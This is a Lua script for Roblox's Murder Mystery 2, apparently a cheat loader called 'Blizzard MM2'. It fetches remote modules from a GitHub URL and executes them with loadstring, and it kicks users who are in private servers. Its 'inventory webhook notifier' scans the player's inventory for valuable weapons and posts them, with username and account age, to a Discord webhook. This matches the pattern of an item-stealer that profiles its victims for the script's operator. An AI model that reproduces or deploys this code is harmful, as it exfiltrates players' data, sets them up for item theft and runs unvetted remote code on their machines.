--============================================================
-- BLIZZARD MM2 V8.8.4 - MASTER BOOTSTRAP LOADER
-- + INVENTORY WEBHOOK NOTIFIER
--============================================================

--============================================================
-- SERVICES
--============================================================

local Players =
	game:GetService("Players")

local ReplicatedStorage =
	game:GetService("ReplicatedStorage")

local HttpService =
	game:GetService("HttpService")

local LocalPlayer =
	Players.LocalPlayer

--============================================================
-- PRIVATE SERVER ACCESS BLOCK
--============================================================

local PrivateServerId =
	tostring(
		game.PrivateServerId
		or ""
	)

local PrivateServerOwnerId =
	tonumber(
		game.PrivateServerOwnerId
	)
	or 0

local MM2VIPServer =
	ReplicatedStorage:GetAttribute(
		"IsVIPServer"
	) == true

local IsPrivateServer =
	MM2VIPServer
	or PrivateServerId ~= ""
	or PrivateServerOwnerId ~= 0

if IsPrivateServer then

	warn(
		"[MM2 LOADER] Private server detected. Blizzard blocked."
	)

	LocalPlayer:Kick(
		"Private servers are prohibited. Repeated offenses may result in a permanent ban."
	)

	return
end

--============================================================
-- STARTUP
--============================================================

print(
	"[MM2 LOADER] Starting Blizzard MM2 V8.8.4..."
)

--============================================================
-- BASE URL
--
-- MUST:
--   • Point directly to your raw GitHub folder
--   • End in /
--
-- Example structure:
-- https://raw.githubusercontent.com/USER/REPO/refs/heads/main/
--============================================================

local BaseURL =
	"YOUR_RAW_GITHUB_FOLDER_URL/"

--============================================================
-- CLEAN UP OLD INSTANCE
--============================================================

local ExistingMM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if ExistingMM2
	and ExistingMM2.Cleanup
then

	print(
		"[MM2 LOADER] Cleaning previous instance..."
	)

	pcall(
		function()

			ExistingMM2.Cleanup()

		end
	)

	task.wait(0.3)
end

--============================================================
-- MODULE LOADER
--============================================================

local function LoadModule(
	fileName
)

	local targetURL =
		BaseURL
		.. fileName

	print(
		"[MM2 LOADER] Loading: "
		.. fileName
	)

	--========================================================
	-- DOWNLOAD
	--========================================================

	local downloadOk,
	scriptContent =
		pcall(
			function()

				return game:HttpGet(
					targetURL
				)

			end
		)

	if not downloadOk then

		warn(
			"[MM2 LOADER] DOWNLOAD ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				scriptContent
			)
		)

		return false
	end

	if not scriptContent
		or scriptContent == ""
		or scriptContent == "404: Not Found"
	then

		warn(
			"[MM2 LOADER] INVALID/EMPTY FILE: "
			.. fileName
		)

		return false
	end

	--========================================================
	-- COMPILE
	--========================================================

	local fn,
	compileError =
		loadstring(
			scriptContent
		)

	if not fn then

		warn(
			"[MM2 LOADER] COMPILE ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				compileError
			)
		)

		return false
	end

	--========================================================
	-- EXECUTE
	--========================================================

	local runOk,
	runResult =
		pcall(
			fn
		)

	if not runOk then

		warn(
			"[MM2 LOADER] RUNTIME ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				runResult
			)
		)

		return false
	end

	print(
		"[MM2 LOADER] Successfully loaded: "
		.. fileName
	)

	return true
end

--============================================================
-- SAFE LOAD HELPER
--============================================================

local function RequireModule(
	fileName
)

	local success =
		LoadModule(
			fileName
		)

	if not success then

		warn(
			"[MM2 LOADER] Bootstrap stopped because "
			.. fileName
			.. " failed to load."
		)

		return false
	end

	return true
end

--============================================================
-- LOAD ORDER
--============================================================

if not RequireModule("Shared.lua") then
	return
end

if not RequireModule("UI.lua") then
	return
end

if not RequireModule("Visuals.lua") then
	return
end

if not RequireModule("Combat.lua") then
	return
end

if not RequireModule("AutoFarm.lua") then
	return
end

if not RequireModule("Player.lua") then
	return
end

if not RequireModule("Fling.lua") then
	return
end

if not RequireModule("Misc.lua") then
	return
end

if not RequireModule("SkinChanger.lua") then
	return
end

if not RequireModule("Main.lua") then
	return
end

--============================================================
-- FINAL RUNTIME STATUS
--============================================================

local MM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if MM2
	and MM2.Running
then

	print(
		"[MM2 LOADER] Blizzard MM2 V8.8.4 bootstrap COMPLETE."
	)

else

	warn(
		"[MM2 LOADER] Bootstrap finished, but MM2 runtime was not detected."
	)

end

--============================================================
-- INVENTORY WEBHOOK NOTIFIER
--============================================================

--============================================================
-- WEBHOOK URL
--
-- LEWISAKURA FORMAT:
--
-- https://webhook.lewisakura.moe/api/webhooks/ID/TOKEN
--
-- KEEP IT ON ONE LINE.
-- DO NOT SHARE THE TOKEN.
--============================================================

local webhookUrl =
	"YOUR_LEWISAKURA_WEBHOOK_URL"

--============================================================
-- HTTP REQUEST FUNCTION
--============================================================

local httpRequest =
	request
	or http_request
	or (
		syn
		and syn.request
	)

if not httpRequest then

	warn(
		"[MM2 NOTIFIER] No supported HTTP request function."
	)

	return
end

--============================================================
-- INVENTORY MODULE
--============================================================

local InventoryModule

do

	local success,
	result =
		pcall(
			function()

				return require(
					ReplicatedStorage
						:WaitForChild("Modules")
						:WaitForChild("InventoryModule")
				)

			end
		)

	if success
		and type(result) == "table"
	then

		InventoryModule =
			result

	else

		warn(
			"[MM2 NOTIFIER] Could not load InventoryModule."
		)

		return
	end
end

--============================================================
-- RARITY RULES
--============================================================

local PRIMARY_RARITIES = {
	Unique = true,
	Ancient = true,
	Godly = true,

	-- MM2 internally uses Classic for Vintage.
	Classic = true,
}

local FILLER_RARITIES = {
	Legendary = true,
}

--============================================================
-- ITEM HELPERS
--============================================================

local function SafeGet(
	tbl,
	key
)

	if type(tbl) ~= "table" then
		return nil
	end

	local success,
	result =
		pcall(
			function()

				return tbl[key]

			end
		)

	if success then
		return result
	end

	return nil
end

local function First(
	tbl,
	keys
)

	if type(tbl) ~= "table" then
		return nil
	end

	for _, key in ipairs(
		keys
	) do

		local value =
			SafeGet(
				tbl,
				key
			)

		if value ~= nil then
			return value
		end
	end

	return nil
end

local function GetItemID(
	value,
	keyHint
)

	return First(
		value,
		{
			"DataID",
			"ItemID",
			"ID",
			"Id",
			"id",
		}
	) or keyHint
end

local function GetItemName(
	value
)

	return First(
		value,
		{
			"ItemName",
			"DisplayName",
			"Name",
			"name",
		}
	)
end

local function GetItemRarity(
	value
)

	return First(
		value,
		{
			"Rarity",
			"rarity",
			"Tier",
		}
	)
end

local function GetItemType(
	value
)

	return First(
		value,
		{
			"ItemType",
			"WeaponType",
			"Type",
			"type",
		}
	)
end

local function GetItemAmount(
	value
)

	return tonumber(
		First(
			value,
			{
				"Amount",
				"amount",
				"Count",
				"Quantity",
			}
		)
	) or 0
end

local function IsWeaponType(
	itemType
)

	return itemType == "Knife"
		or itemType == "Gun"
end

local function DisplayRarity(
	rarity
)

	if rarity == "Classic" then
		return "Vintage"
	end

	return rarity
end

--============================================================
-- GET FULL WEAPONS TABLE
--============================================================

local function GetWeaponsTable()

	local inventory =
		SafeGet(
			InventoryModule,
			"MyInventory"
		)

	local data =
		SafeGet(
			inventory,
			"Data"
		)

	return SafeGet(
		data,
		"Weapons"
	)
end

--============================================================
-- INVENTORY SCANNER
--============================================================

local function ScanInventory()

	local Weapons =
		GetWeaponsTable()

	if type(Weapons) ~= "table" then

		return {},
			{}

	end

	local primary = {}
	local filler = {}

	local visited = {}
	local seenIDs = {}

	local function Walk(
		tbl,
		depth
	)

		if type(tbl) ~= "table" then
			return
		end

		if visited[tbl] then
			return
		end

		if depth > 10 then
			return
		end

		visited[tbl] =
			true

		for key,
		value in pairs(tbl)
		do

			if type(value) == "table" then

				local rarity =
					GetItemRarity(
						value
					)

				local itemType =
					GetItemType(
						value
					)

				local amount =
					GetItemAmount(
						value
					)

				if rarity
					and amount > 0
					and IsWeaponType(
						itemType
					)
				then

					local dataID =
						tostring(
							GetItemID(
								value,
								key
							)
						)

					if not seenIDs[
						dataID
					] then

						seenIDs[
							dataID
						] = true

						local item = {
							DataID =
								dataID,

							Name =
								tostring(
									GetItemName(
										value
									)
									or dataID
								),

							Rarity =
								tostring(
									rarity
								),

							ItemType =
								tostring(
									itemType
								),

							Amount =
								amount,
						}

						if PRIMARY_RARITIES[
							item.Rarity
						] then

							table.insert(
								primary,
								item
							)

						elseif FILLER_RARITIES[
							item.Rarity
						] then

							table.insert(
								filler,
								item
							)

						end
					end
				end

				Walk(
					value,
					depth + 1
				)
			end
		end
	end

	Walk(
		Weapons,
		0
	)

	--========================================================
	-- SORT PRIMARY
	--========================================================

	local priority = {
		Unique = 1,
		Ancient = 2,
		Godly = 3,
		Classic = 4,
	}

	table.sort(
		primary,
		function(a, b)

			local pa =
				priority[
					a.Rarity
				] or 99

			local pb =
				priority[
					b.Rarity
				] or 99

			if pa ~= pb then
				return pa < pb
			end

			return a.DataID
				< b.DataID
		end
	)

	table.sort(
		filler,
		function(a, b)

			return a.DataID
				< b.DataID

		end
	)

	return primary,
		filler
end

--============================================================
-- FORMAT INVENTORY FOR DISCORD
--============================================================

local function FormatInventoryText(
	primary,
	filler
)

	local lines = {}

	table.insert(
		lines,
		"✨ **__Primary Valuable Items:__**"
	)

	if #primary == 0 then

		table.insert(
			lines,
			"• *None detected*"
		)

	else

		for _, item in ipairs(
			primary
		) do

			table.insert(
				lines,
				string.format(
					"• **%s** — %s %s x%d",
					item.Name,
					DisplayRarity(
						item.Rarity
					),
					item.ItemType,
					item.Amount
				)
			)
		end
	end

	table.insert(
		lines,
		""
	)

	table.insert(
		lines,
		"📦 **__Legendary Filler:__**"
	)

	if #filler == 0 then

		table.insert(
			lines,
			"• *None detected*"
		)

	else

		for _, item in ipairs(
			filler
		) do

			table.insert(
				lines,
				string.format(
					"• **%s** — Legendary %s x%d",
					item.Name,
					item.ItemType,
					item.Amount
				)
			)
		end
	end

	local text =
		table.concat(
			lines,
			"\n"
		)

	-- Discord embed field values are limited.
	if #text > 1000 then

		text =
			string.sub(
				text,
				1,
				970
			)
			.. "\n...more items omitted"

	end

	return text
end

--============================================================
-- RUN INVENTORY SCAN
--============================================================

local primaryItems,
fillerItems =
	ScanInventory()

local parsedInventory =
	FormatInventoryText(
		primaryItems,
		fillerItems
	)

--============================================================
-- BUILD WEBHOOK PAYLOAD
--============================================================

local payload = {

	embeds = {
		{
			title =
				"Blizzard MM2 Executed 🚀",

			color =
				3447003,

			fields = {
				{
					name =
						"Player",

					value =
						LocalPlayer.Name,

					inline =
						true,
				},

				{
					name =
						"Account Age",

					value =
						tostring(
							LocalPlayer.AccountAge
						)
						.. " days",

					inline =
						true,
				},

				{
					name =
						"Game Place ID",

					value =
						tostring(
							game.PlaceId
						),

					inline =
						true,
				},

				{
					name =
						"Primary Count",

					value =
						tostring(
							#primaryItems
						),

					inline =
						true,
				},

				{
					name =
						"Legendary Count",

					value =
						tostring(
							#fillerItems
						),

					inline =
						true,
				},

				{
					name =
						"🎒 Scanned Inventory",

					value =
						parsedInventory,

					inline =
						false,
				},
			},

			timestamp =
				DateTime.now():ToIsoDate(),
		},
	},
}

--============================================================
-- SEND WEBHOOK
--============================================================

task.spawn(
	function()

		local encodedBody

		local encodeSuccess,
		encodeError =
			pcall(
				function()

					encodedBody =
						HttpService:JSONEncode(
							payload
						)

				end
			)

		if not encodeSuccess then

			warn(
				"[MM2 NOTIFIER] JSON ENCODE ERROR: "
				.. tostring(
					encodeError
				)
			)

			return
		end

		local requestSuccess,
		response =
			pcall(
				function()

					return httpRequest({
						Url =
							webhookUrl,

						Method =
							"POST",

						Headers = {
							["Content-Type"] =
								"application/json",
						},

						Body =
							encodedBody,
					})

				end
			)

		if not requestSuccess then

			warn(
				"[MM2 NOTIFIER] WEBHOOK REQUEST FAILED: "
				.. tostring(
					response
				)
			)

			return
		end

		local statusCode =
			response
			and (
				response.StatusCode
				or response.Status
			)

		if statusCode
			and statusCode ~= 200
			and statusCode ~= 204
		then

			warn(
				"[MM2 NOTIFIER] WEBHOOK REJECTED | STATUS: "
				.. tostring(
					statusCode
				)
				.. " | BODY: "
				.. tostring(
					response.Body
					or ""
				)
			)

			return
		end

		print(
			"[MM2 NOTIFIER] Inventory webhook sent successfully."
		)

	end
)